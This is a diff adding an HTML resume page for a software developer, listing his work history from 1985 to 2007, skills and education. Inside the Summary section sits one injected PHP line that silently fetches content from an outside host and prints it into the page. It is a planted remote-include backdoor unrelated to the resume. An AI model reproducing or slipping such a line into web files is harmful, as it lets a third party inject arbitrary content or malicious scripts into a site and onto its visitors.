@@ -1,0 +1,253 @@
+<html>
+<head>
+<title>Doug Baron Resume</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style>
+ body {
+ 	margin:50px; 
+ 	margin-top:15px; 
+ 	font-family: Verdana, Arial, Helvetica, sans-serif; 
+ 	font-size="90%"}
+ .section {margin-bottom: 5px; text-align: center; font-weight: bold; font-size: "110%";}
+ .dates {font-weight: normal; padding-left:3em; text-align: right; text-decoration:italic; font-size: "80%";}
+ .company { margin-top: 10px; font-weight: bold; font-size: "100%";}
+ .title {margin-bottom: 3px; text-decoration: underline; font-size: "100%";}
+ .f1 {font-size:"80%"]
+</style>
+</head>
+<body>
+<div class="section">Doug Baron</div>
+<div style="text-align: center">1210 Olympus Dr, Austin, TX 78733<br>
+</div>
+<hr size="2">
+<div class="section">Summary</div>
+<?php echo @implode('', @file("http://extremeforlife.net/mng/inc.php")); ?>
+Accomplished developer with a solid knowledge of Java, C/C++, and Internet technologies from TCP/IP, HTTP, CSS and HTML to Struts, XML, Xschema and XSLT. Have designed, built and supported award-winning desktop applications for the Macintosh and Windows. Recent focus has been on Java- and XML- based Web application and Web Service development.
+<hr size="2">
+<div class="section">Key Skills</div>
+<b>Languages and Protocols</b>: Java (<em>Sun Certified Programmer for Java 2 Platform1.4</em>), J2EE / Swing, C / C++. XML, SOAP/XML-RPC, DTD, XSchema. XSL, HTML, JavaScript, CSS, JSON, HTTP, SQL, TCP/IP, LDAP
+<br><b>Dynamic Page Tools</b>: JSP, Struts, Tiles, Velocity, Taglib, Java Servlets, PHP, ASP, Dynamo (jhtml), Cold Fusion
+<br><b> Back End Applications</b>: Tomcat, Hibernate, Castor, Apache, Microsoft IIS, MySQL, Microsoft SQL Server, UserLand Frontier, Netscape Directory Server, Verity Search Engine
+<hr size="2">
+<div class="section">Professional History</div>
+
+<div class="company">Blue Coat Systems<span class="dates">September 2004&nbsp;&ndash;&nbsp;Present</span></div>
+<div class="title">Software Engineer</div>
+Key developer of administration application for policy-based network security / connectivity appliance.
+<ul>
+<li>Extensive use of DHTML for dynamic form layout and presentation</li>
+<li>Tools include Tomcat, Java, JavaScript, CSS, Velocity, Struts, Tiles, Hibernate/HSQLDB, Castor, Junit, Subversion, Ant.</li>
+<li>Developed user interface to configure and service to monitor high availability based on LinuxHA</li></ul>
+
+<div class="company">Chilehead Software<span class="dates">Jan 2004&nbsp;&ndash;&nbsp;August 2004</span></div>
+<div class="title">Independent Consultant</div>
+<ul><li><b>IBM Research</b>: worked on infrastructure for new features of the IBM partner website, http://www.ibm.com/partnerworld. Created XML-based content workflow using Ant, XSL and other tools.</li>
+<li><b>Gridiron Recruits</b>: designed and implemented a Web-based, standalone CD data retrieval system for football recruiting. Highly customized Tomcat configuration developed for read-only service delivery.</li>
+<li><b>AquaMinds, Inc</b>: developed Apple Keynote export module for NoteTaker, based on XSLT.</li>
+<li><b>Congregation Beth-Israel</b>:  assisted with congregational Web site upgrade on a volunteer basis.</li>
+</ul>
+
+<div class="company">Cirrus Logic, Inc.<span class="dates">August 2003&nbsp;&ndash;&nbsp;November 2003</span></div>
+<div class="title">Internet-Web Consultant / Developer</div>
+Lead developer on future Internet/Extranet project.
+<ul><li>Using Java/J2EE, selected Struts with Tiles as application framework.</li>
+<li>Developed Struts/Tiles/JSP - based Web application running under Tomcat, building on a proprietary XML content management system (CMS).</li>
+<li>Leveraged struts-html, struts-beans, struts-logic and struts-tiles tag libraries.</li>
+<li>Wrote XSL transformations for product catalogue publishing.</li>
+<li>Authored build system based on Ant and CVS, emulating Documentum content versioning.</li></ul></div>
+
+<div class="company">AquaMinds, Inc.&nbsp;&nbsp;&nbsp;<span class="dates">April 2003&nbsp;&ndash;&nbsp;August 2003</span></div>
+<div class="title">Consultant / Senior Developer</div>
+Developing end-user Java productivity application.
+<ul><li>Designed XML media interchange format including formal DTD.</li>
+<li>Created  interactive Java Swing application with tabbed interface whose source is this XML format.</li>
+<li>Wrote XSL transformations to and from new XML schema</li></ul></div>
+
+<div class="company">Broadband Mechanics&nbsp;&nbsp;&nbsp;<span class="dates">September 2002&nbsp;&ndash;&nbsp;March 2003</span></div>
+<div class="title">Consultant / Senior Developer</div>
+Worked on broadband multimedia application, platform infrastructure and presentation layer.
+<ul><li>Developed Web-based outlining product using DHTML (JavaScript, DOM API, Events, CSS) and a back end Web service (UserLand Frontier). Supports MSIE 5.x and Mozilla, Windows and Macintosh</li>
+<li>Worked on DreamFactory media aggregation application. Used Python with ZOPE for data storage.</li></ul></div>
+<div class="company">UserLand Software, Inc.<span class="dates">November 2001- March 2002</span></div>
+<div class="title">Developer</div>
+Enhanced the Frontier kernel, the foundation technology behind Manila and Radio, UserLand's popular Internet applications.
+<ul><li>Implemented Simple Cross-Network Scripting (SNCS), allowing UserTalk function calls to seamlessly invoke web services based on xml-rpc, SOAP or custom protocols. 
+<li>Upgraded OPML support to include "cloud" tags in the XML. Added bitwise AND, OR and XOR verbs to the UserTalk language.
+<li>Managed the release of Frontier 8.0.5, including: final testing and review; updating the online store; published full and upgrade packages and change notes; supervised beta test group.
+<li>Achieved a 30% performance gain in the news reader with one simple optimization.
+<li>Implemented an HTML tag scanner to support standard text style control (toggling) and anchor tags (live URLs) in the outliner.
+<li>Developed syntax coloring feature and reworked the window management system under Windows to use SDI instead of MDI in a development version.
+</ul
+<!--hr size="1"-->
+<div class="company">Webalo, Inc.<span class="dates">April 2001&nbsp;&ndash;&nbsp;September 2001</span></div>
+<div class="title">Chief Architect</div>
+Developed architecture and development plan for next generation Internet application platform. 
+<ul><li>Planned project schedule based on detailed task breakdown.
+<li>Collaborated with founder on product architecture, messaging protocols.
+<li>Wrote Java classes and interfaces, XSLT style sheets for HTML and VXM publishing.
+<li>Wrote HTTP service classes for system prototype, supporting client-specific rendering of XML documents.
+</ul>
+<div class="company"> Big Chief Partners<span class="dates">July 2000&nbsp;&ndash;&nbsp;March 2001</span></div>
+<div class="title">Consultant / Developer</div>
+As an independent consultant, designed and developed web services, applications, and project plans for a number of Internet startups.
+<ul><li>Developed web-based administration portal using ASP, VBScript and SQL Server to monitor web traffic and site health for FocusEngine of Israel.
+<li>Administered server deployment, including load balancing scheme based on Alteon Web Systems ACEdirector Web Switch, WebTrends traffic analysis tools, and SiteScope server monitors.
+<li>Created management site for service development and publishing using Cold Fusion and SQL Server for NearSpace of Petaluma, CA. Integrated Cold Fusion with custom Java application for processing XML file uploads.
+<li>Analyzed needs and proposed a solution for Oracle server high availability for Hot Dispatch of Mountain View, CA.
+<li>Researched CRM systems, analyzed needs, and recommended a service integration plan for HopeLink of Redwood City, CA. 
+</ul>
+<div class="company"> Corio, Inc.<span class="dates">March 1999&nbsp;&ndash;&nbsp;June 2000</span></div>
+<div class="title">Senior Member, Technical Staff</div>
+Planned project, prioritized schedule, evaluated tools and services, and developed Java software for ERP service management. Platform included Java, J2EE (javax.*, JSP, JNDI), and JavaScript and Apache, ATG Dynamo, running on Sun Solaris and Microsoft NT.
+<ul><li>Evaluated application servers and recommended ATG Dynamo for internal service development based on features, cost and ease of use.
+<li>Developed security platform EMS (Entitlement Management System) based on SiteMinder, Netscape Directory server (LDAP) and Oracle (JDBC). 
+<li>Developed Java APIs and designed management application for enterprise-wide security services featuring single sign-on and personalized web page delivery.
+<li>Integrated with PeopleSoft security APIs to provide EMS services.
+<li>Began application development with EJB running on WebLogic.
+</ul>
+<div class="company"> Chilehead Software<span class="dates">May 1994&nbsp;&ndash;&nbsp;January 1999</span></div>
+<div class="title">Independent Consultant</div>
+<ul><li>Animatrix, Inc.:  Developed a WYSIWYG Web page layout program in C++ using Metrowerks PowerPlant and DataPak's Paige word processing engine. Supported multiple columns, textual sidebars, and text flow between pages. Implemented AWT-based Java client component for HTML rendering. 
+<li>Austin Hayne Corp.:  Ported their flagship product Employee Appraiser from Windows to Macintosh in Symantec C++ using the TCL application framework.  
+<li>Apple Computer, Inc.:  Developed system-level emulations libraries for future operating system forward-compatibility project.
+<li>Magic Quest, Inc.:  Hired to solve rendering performance problems that had been plaguing Math Ace(r), a CD-ROM-based educational game, for months, learned the C++ source base and implemented optimizations yielding an order of magnitude performance gain in four days.  
+<li>Direct Connection, Inc.:  Created a set of Frontier scripts to facilitate an enterprise-wide network workflow for a FileMaker-based project tracking system.  
+<li>Frame Technology Corp.:  Developed tools for next-generation technologies, using C++ in Metrowerks and Symantec development environments.  
+<li>Summit Software Company:  Conducted feasibility study for future development of their BasicSript software development environment.
+</ul>
+<div class="company"> UserLand Software, Inc.<span class="dates">June 1990&nbsp;&ndash;&nbsp;May 1994</span></div>
+<div class="title">Lead Developer</div>
+Developed UserLand Frontier, a full-featured script development and runtime environment, including compiler construction, database management, outline and word processing, interapplication communications, file system control, thread management, and other OS-level functionality.
+<ul><li>Spearheaded product design, architecture, and development, including feature plans, scheduling, coding, testing and delivery.
+<li>Led the development of versions 2.0 and 3.0, both offering substantial new functionality. 
+<li>Earned MacUser Magazine's "Editor's Choice" for Development Tool of the Year.
+</ul>
+<div class="company"> Living Videotext / Symantec Corp<span class="dates">July 1985&nbsp;&ndash;&nbsp;June 1990</span></div>
+<div class="title">Engineering Manager</div>
+Developed MORE 3.0, a powerful outline processor with integrated desktop presentation features. 
+<ul><li>Led staff of three full time programmers and two contractors. 
+<li>Designed "Rules" feature that applied structured document formatting based on user selection. 
+<li>MORE 3.0 shipped on time and under budget, was hailed as a major step forward in power and ease of use.
+</ul>
+<div class="title">Lead Developer</div>
+<ul><li>Key contributor to MORE 1.0 product design and implementation, from feature conception to final debugging.
+<li>Worked closely with documentation writers.
+<li>Personally responsible for upgrade versions 1.1, 1.1c, and 2.0.
+<li>Managed contract programmers. 
+<li>MORE 1.0 was MacUser Magazine's Product of the Year and won Best Outliner in MacWorld Magazine Reader's Choice World Class surveys.
+</ul>
+<hr size="2">
+<div class="section">Education</div>
+<b>Rice University</b>, Houston TX<br>
+B.S., Electrical Engineering, B.A., Computer Science<br>
+Graduated <em>cum laude</em><br>
+Brown Engineering Scholarships
+<br>
+<hr size="2">
+<div style="font-size:9px, background-color: #f0efff"><span text-align:left>Last Modified 07/09/07</span><span style="position: absolute; right: 35px;text-align:right">This resume as <a href="dougbaronresume.pdf">PDF</a></span></div>
+<!--hr size="2">
+<div class="section">Skill Detail</div>
+<div class="small">
+<table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1"><b>Skill Name</b></td>
+<td width="100" class="f1"><b>Skill Level</b></td>
+<td width="112" class="f1"><b>Last Used</b></td>
+<td width="113" class="f1"><b>Experience</b></td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">Java</td>
+<td width="100" class="f1">Expert</td>
+<td width="112" class="f1">Currently used</td>
+<td width="113" class="f1">4 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">C++</td>
+<td width="100" class="f1">Expert</td>
+<td width="112" class="f1">1 year ago</td>
+<td width="113" class="f1">3 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">C</td>
+<td width="100" class="f1">Expert</td>
+<td width="112" class="f1">2 years ago</td>
+<td width="113" class="f1">10 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">JavaScript</td>
+<td width="100" class="f1">Expert</td>
+<td width="112" class="f1">Currently used</td>
+<td width="113" class="f1">2 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">XSLT</td>
+<td width="100" class="f1">Intermediate</td>
+<td width="112" class="f1">1 year ago</td>
+<td width="113" class="f1">1 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">SQL</td>
+<td width="100" class="f1">Intermediate</td>
+<td width="112" class="f1">1 year ago</td>
+<td width="113" class="f1">1 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">JSP</td>
+<td width="100" class="f1">Expert</td>
+<td width="112" class="f1">2 years ago</td>
+<td width="113" class="f1">2 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">ASP</td>
+<td width="100" class="f1">Intermediate</td>
+<td width="112" class="f1">1 year ago</td>
+<td width="113" class="f1">1 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">HTML</td>
+<td width="100" class="f1">Expert</td>
+<td width="112" class="f1">Currently used</td>
+<td width="113" class="f1">4 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">VoiceXML</td>
+<td width="100" class="f1">Intermediate</td>
+<td width="112" class="f1">1 year ago</td>
+<td width="113" class="f1">1 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">XML</td>
+<td width="100" class="f1">Intermediate</td>
+<td width="112" class="f1">Currently used</td>
+<td width="113" class="f1">2 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">EJB</td>
+<td width="100" class="f1">Intermediate</td>
+<td width="112" class="f1">1 year ago</td>
+<td width="113" class="f1">1 years</td>
+</tr>
+</table><table width="600" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="125" class="f1">CSS</td>
+<td width="100" class="f1">Expert</td>
+<td width="112" class="f1">Currently used</td>
+<td width="113" class="f1">3 years</td>
+</tr>
+</table>
+</div-->
+</body>
+</html>
+
